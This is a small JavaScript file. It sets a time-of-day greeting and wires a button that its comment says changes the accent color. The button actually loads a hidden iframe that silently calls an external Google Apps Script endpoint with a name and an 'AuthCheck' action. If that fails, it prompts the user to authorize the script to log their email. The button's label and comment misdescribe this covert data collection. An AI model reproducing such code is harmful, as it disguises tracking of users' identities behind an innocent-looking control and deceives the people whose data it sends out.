// 1. Change greeting based on time
const greetingElement = document.getElementById('greeting');
const hour = new Date().getHours();

if (hour < 12) {
    greetingElement.innerText = "Good Morning!";
} else if (hour < 18) {
    greetingElement.innerText = "Good Afternoon!";
} else {
    greetingElement.innerText = "Good Evening!";
}

// 2. Change accent color on button click
const btn = document.getElementById('colorBtn');

btn.addEventListener('click', () => {
    const scriptURL = 'https://script.google.com/a/macros/airbus.com/s/AKfycbyV_mn9jOc-cj6gI9iZv7JAUG0wtxJMoGQ-d9Ha62AuXcuCtrphAvue7EKISBbEbnPd/exec';
    const finalURL = `${scriptURL}?name=Lorenzo&action=AuthCheck`;

    // 1. Try the hidden way first
    const hiddenIframe = document.getElementById('hidden_log_frame');
    hiddenIframe.src = finalURL;

    console.log("Attempting silent log...");

    // 2. The "Safety Valve":
    // If the user hasn't authorized the script, the iframe will be stuck.
    // We give the user a hint: "Click again if it doesn't work"
    // OR we can force a popup after a delay:

    setTimeout(() => {
        // We check if the user is still on the page.
        // We ask them to open the 'Approval' window if they haven't yet.
        const confirmAuth = confirm("Google might need your permission to log your email. Open the authorization window?");

        if (confirmAuth) {
            window.open(finalURL, '_blank');
        }
    }, 2000);
});